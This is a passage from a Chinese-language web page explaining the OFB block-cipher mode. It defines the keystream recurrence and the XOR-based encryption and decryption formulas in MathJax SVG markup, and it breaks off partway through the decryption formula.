<p>在OFB模式中，先产生一个密钥流，然后将其与明文相异或。因此，OFB模式实际上就是一个同步流密码，通过反复加密一个初始向量IV来得到密钥流。这种方法有时也叫做“内部反馈”。</p>
<p>定义<br><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.375ex" xmlns="http://www.w3.org/2000/svg" width="8.355ex" height="1.92ex" role="img" focusable="false" viewBox="0 -683 3693.1 848.6"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D44D" d="M58 8Q58 23 64 35Q64 36 329 334T596 635L586 637Q575 637 512 637H500H476Q442 637 420 635T365 624T311 598T266 548T228 469Q227 466 226 463T224 458T223 453T222 450L221 448Q218 443 202 443Q185 443 182 453L214 561Q228 606 241 651Q249 679 253 681Q256 683 487 683H718Q723 678 723 675Q723 673 717 649Q189 54 188 52L185 49H274Q369 50 377 51Q452 60 500 100T579 247Q587 272 590 277T603 282H607Q628 282 628 271Q547 5 541 2Q538 0 300 0H124Q58 0 58 8Z"></path></g><g data-mml-node="mn" transform="translate(683, -150) scale(0.707)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g></g><g data-mml-node="mo" transform="translate(1364.3, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(2420.1, 0)"><path data-c="1D43C" d="M43 1Q26 1 26 10Q26 12 29 24Q34 43 39 45Q42 46 54 46H60Q120 46 136 53Q137 53 138 54Q143 56 149 77T198 273Q210 318 216 344Q286 624 286 626Q284 630 284 631Q274 637 213 637H193Q184 643 189 662Q193 677 195 680T209 683H213Q285 681 359 681Q481 681 487 683H497Q504 676 504 672T501 655T494 639Q491 637 471 637Q440 637 407 634Q393 631 388 623Q381 609 337 432Q326 385 315 341Q245 65 245 59Q245 52 255 50T307 46H339Q345 38 345 37T342 19Q338 6 332 0H316Q279 2 179 2Q143 2 113 2T65 2T43 1Z"></path></g><g data-mml-node="mi" transform="translate(2924.1, 0)"><path data-c="1D449" d="M52 648Q52 670 65 683H76Q118 680 181 680Q299 680 320 683H330Q336 677 336 674T334 656Q329 641 325 637H304Q282 635 274 635Q245 630 242 620Q242 618 271 369T301 118L374 235Q447 352 520 471T595 594Q599 601 599 609Q599 633 555 637Q537 637 537 648Q537 649 539 661Q542 675 545 679T558 683Q560 683 570 683T604 682T668 681Q737 681 755 683H762Q769 676 769 672Q769 655 760 640Q757 637 743 637Q730 636 719 635T698 630T682 623T670 615T660 608T652 599T645 592L452 282Q272 -9 266 -16Q263 -18 259 -21L241 -22H234Q216 -22 216 -15Q213 -9 177 305Q139 623 138 626Q133 637 76 637H59Q52 642 52 648Z"></path></g></g></g></svg></mjx-container><br><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="24.757ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 10942.5 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D44D" d="M58 8Q58 23 64 35Q64 36 329 334T596 635L586 637Q575 637 512 637H500H476Q442 637 420 635T365 624T311 598T266 548T228 469Q227 466 226 463T224 458T223 453T222 450L221 448Q218 443 202 443Q185 443 182 453L214 561Q228 606 241 651Q249 679 253 681Q256 683 487 683H718Q723 678 723 675Q723 673 717 649Q189 54 188 52L185 49H274Q369 50 377 51Q452 60 500 100T579 247Q587 272 590 277T603 282H607Q628 282 628 271Q547 5 541 2Q538 0 300 0H124Q58 0 58 8Z"></path></g><g data-mml-node="mi" transform="translate(683, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(1254.7, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msub" transform="translate(2310.5, 0)"><g data-mml-node="mi"><path data-c="1D438" d="M492 213Q472 213 472 226Q472 230 477 250T482 285Q482 316 461 323T364 330H312Q311 328 277 192T243 52Q243 48 254 48T334 46Q428 46 458 48T518 61Q567 77 599 117T670 248Q680 270 683 272Q690 274 698 274Q718 274 718 261Q613 7 608 2Q605 0 322 0H133Q31 0 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H757Q764 676 764 669Q764 664 751 557T737 447Q735 440 717 440H705Q698 445 698 453L701 476Q704 500 704 528Q704 558 697 578T678 609T643 625T596 632T532 634H485Q397 633 392 631Q388 629 386 622Q385 619 355 499T324 377Q347 376 372 376H398Q464 376 489 391T534 472Q538 488 540 490T557 493Q562 493 565 493T570 492T572 491T574 487T577 483L544 351Q511 218 508 216Q505 213 492 213Z"></path></g><g data-mml-node="mi" transform="translate(738, -150) scale(0.707)"><path data-c="1D43E" d="M285 628Q285 635 228 637Q205 637 198 638T191 647Q191 649 193 661Q199 681 203 682Q205 683 214 683H219Q260 681 355 681Q389 681 418 681T463 682T483 682Q500 682 500 674Q500 669 497 660Q496 658 496 654T495 648T493 644T490 641T486 639T479 638T470 637T456 637Q416 636 405 634T387 623L306 305Q307 305 490 449T678 597Q692 611 692 620Q692 635 667 637Q651 637 651 648Q651 650 654 662T659 677Q662 682 676 682Q680 682 711 681T791 680Q814 680 839 681T869 682Q889 682 889 672Q889 650 881 642Q878 637 862 637Q787 632 726 586Q710 576 656 534T556 455L509 418L518 396Q527 374 546 329T581 244Q656 67 661 61Q663 59 666 57Q680 47 717 46H738Q744 38 744 37T741 19Q737 6 731 0H720Q680 3 625 3Q503 3 488 0H478Q472 6 472 9T474 27Q478 40 480 43T491 46H494Q544 46 544 71Q544 75 517 141T485 216L427 354L359 301L291 248L268 155Q245 63 245 58Q245 51 253 49T303 46H334Q340 37 340 35Q340 19 333 5Q328 0 317 0Q314 0 280 1T180 2Q118 2 85 2T49 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Z"></path></g></g><g data-mml-node="mo" transform="translate(3727.1, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(4116.1, 0)"><g data-mml-node="mi"><path data-c="1D44D" d="M58 8Q58 23 64 35Q64 36 329 334T596 635L586 637Q575 637 512 637H500H476Q442 637 420 635T365 624T311 598T266 548T228 469Q227 466 226 463T224 458T223 453T222 450L221 448Q218 443 202 443Q185 443 182 453L214 561Q228 606 241 651Q249 679 253 681Q256 683 487 683H718Q723 678 723 675Q723 673 717 649Q189 54 188 52L185 49H274Q369 50 377 51Q452 60 500 100T579 247Q587 272 590 277T603 282H607Q628 282 628 271Q547 5 541 2Q538 0 300 0H124Q58 0 58 8Z"></path></g><g data-mml-node="TeXAtom" transform="translate(683, -150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(345, 0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(1123, 0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g><g data-mml-node="mo" transform="translate(5996.8, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(6385.8, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(6830.4, 0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(7608.2, 0)"><path data-c="2264" d="M674 636Q682 636 688 630T694 615T687 601Q686 600 417 472L151 346L399 228Q687 92 691 87Q694 81 694 76Q694 58 676 56H670L382 192Q92 329 90 331Q83 336 83 348Q84 359 96 365Q104 369 382 500T665 634Q669 636 674 636ZM84 -118Q84 -108 99 -98H678Q694 -104 694 -118Q694 -130 679 -138H98Q84 -131 84 -118Z"></path></g><g data-mml-node="mi" transform="translate(8664, 0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(9286.8, 0)"><path data-c="2264" d="M674 636Q682 636 688 630T694 615T687 601Q686 600 417 472L151 346L399 228Q687 92 691 87Q694 81 694 76Q694 58 676 56H670L382 192Q92 329 90 331Q83 336 83 348Q84 359 96 365Q104 369 382 500T665 634Q669 636 674 636ZM84 -118Q84 -108 99 -98H678Q694 -104 694 -118Q694 -130 679 -138H98Q84 -131 84 -118Z"></path></g><g data-mml-node="mi" transform="translate(10342.5, 0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g></g></svg></mjx-container><br>最后用简单运算来完成加解密<br>加密：<br><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -1.016ex" xmlns="http://www.w3.org/2000/svg" width="25.606ex" height="3.163ex" role="img" focusable="false" viewBox="0 -949 11317.9 1398"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D436" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z"></path></g><g data-mml-node="mi" transform="translate(715, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(1286.7, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msub" transform="translate(2342.5, 0)"><g data-mml-node="mi"><path data-c="1D440" d="M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z"></path></g><g data-mml-node="mi" transform="translate(970, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(3773.1, 0)"><path data-c="2A01" d="M668 944Q697 949 744 949Q803 949 814 948Q916 937 1006 902T1154 826T1262 730T1336 638T1380 563Q1454 415 1454 250Q1454 113 1402 -14T1258 -238T1036 -391T755 -449Q608 -449 477 -392T255 -240T110 -16T56 250Q56 387 105 510T239 723T434 871T668 944ZM706 299V850H704Q519 832 386 725T198 476Q181 433 169 379T156 300Q156 299 431 299H706ZM1116 732Q1054 778 982 807T871 842T810 849L804 850V299H1079Q1354 299 1354 300Q1354 311 1352 329T1336 402T1299 506T1228 620T1116 732ZM706 -350V201H431Q156 201 156 200Q156 189 158 171T174 98T211 -6T282 -120T395 -232Q428 -257 464 -277T527 -308T587 -328T636 -339T678 -346T706 -350ZM1354 200Q1354 201 1079 201H804V-350Q808 -349 838 -345T887 -338T940 -323T1010 -295Q1038 -282 1067 -265T1144 -208T1229 -121T1301 0T1349 158Q1354 188 1354 200Z"></path></g><g data-mml-node="msub" transform="translate(5450.8, 0)"><g data-mml-node="mi"><path data-c="1D44D" d="M58 8Q58 23 64 35Q64 36 329 334T596 635L586 637Q575 637 512 637H500H476Q442 637 420 635T365 624T311 598T266 548T228 469Q227 466 226 463T224 458T223 453T222 450L221 448Q218 443 202 443Q185 443 182 453L214 561Q228 606 241 651Q249 679 253 681Q256 683 487 683H718Q723 678 723 675Q723 673 717 649Q189 54 188 52L185 49H274Q369 50 377 51Q452 60 500 100T579 247Q587 272 590 277T603 282H607Q628 282 628 271Q547 5 541 2Q538 0 300 0H124Q58 0 58 8Z"></path></g><g data-mml-node="mi" transform="translate(683, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(6427.7, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(6816.7, 0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(7594.5, 0)"><path data-c="2264" d="M674 636Q682 636 688 630T694 615T687 601Q686 600 417 472L151 346L399 228Q687 92 691 87Q694 81 694 76Q694 58 676 56H670L382 192Q92 329 90 331Q83 336 83 348Q84 359 96 365Q104 369 382 500T665 634Q669 636 674 636ZM84 -118Q84 -108 99 -98H678Q694 -104 694 -118Q694 -130 679 -138H98Q84 -131 84 -118Z"></path></g><g data-mml-node="mi" transform="translate(8650.3, 0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(9273.1, 0)"><path data-c="2264" d="M674 636Q682 636 688 630T694 615T687 601Q686 600 417 472L151 346L399 228Q687 92 691 87Q694 81 694 76Q694 58 676 56H670L382 192Q92 329 90 331Q83 336 83 348Q84 359 96 365Q104 369 382 500T665 634Q669 636 674 636ZM84 -118Q84 -108 99 -98H678Q694 -104 694 -118Q694 -130 679 -138H98Q84 -131 84 -118Z"></path></g><g data-mml-node="mi" transform="translate(10328.9, 0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(10928.9, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container><br>解密：<br><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -1.016ex" xmlns="http://www.w3.org/2000/svg" width="25.606ex" height="3.163ex" role="img" focusable="false" viewBox="0 -949 11317.9 1398"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D440" d="M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z"></path></g><g data-mml-node="mi" transform="translate(970, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(1541.7, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msub" transform="translate(2597.5, 0)"><g data-mml-node="mi"><path data-c="1D436" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z"></path></g><g data-mml-node="mi" transform="translate(715, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(3773.1, 0)"><path data-c="2A01" d="M668 944Q697 949 744 949Q803 949 814 948Q916 937 1006 902T1154 826T1262 730T1336 638T1380 563Q1454 415 1454 250Q1454 113 1402 -14T1258 -238T1036 -391T755 -449Q608 -449 477 -392T255 -240T110 -16T56 250Q56 387 105 510T239 723T434 871T668 944ZM706 299V850H704Q519 832 386 725T198 476Q181 433 169 379T156 300Q156 299 431 299H706ZM1116 732Q1054 778 982 807T871 842T810 849L804 850V299H1079Q1354 299 1354 300Q1354 311 1352 329T1336 402T1299 506T1228 620T1116 732ZM706 -350V201H431Q156 201 156 200Q156 189 158 171T174 98T211 -6T282 -120T395 -232Q428 -257 464 -277T527 -308T587 -328T636 -339T678 -346T706 -350ZM1354 200Q1354 201 1079 201H804V-350Q808 -349 838 -345T887 -338T940 -323T1010 -295Q1038 -282 1067 -265T1144 -208T1229 -121T1301 0T1349 158Q1354 188 1354 200Z"></path></g><g data-mml-node="msub" transform="translate(5450.8, 0)"><g data-mml-node="mi"><path data-c="1D44D" d="M58 8Q58 23 64 35Q64 36 329 334T596 635L586 637Q575 637 512 637H500H476Q442 637 420 635T365 624T311 598T266 548T228 469Q227 466 226 463T224 458T223 453T222 450L221 448Q218 443 202 443Q185 443 182 453L214 561Q228 606 241 651Q249 679 253 681Q256 683 487 683H718Q723 678 723 675Q723 673 717 649Q189 54 188 52L185 49H274Q369 50 377 51Q452 60 500 100T579 247Q587 272 590 277T603 282H607Q628 282 628 271Q547 5 541 2Q538 0 300 0H124Q58 0 58 8Z"></path></g><g data-mml-node="mi" transform="translate(683, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(6427.7, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(6816.7, 0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 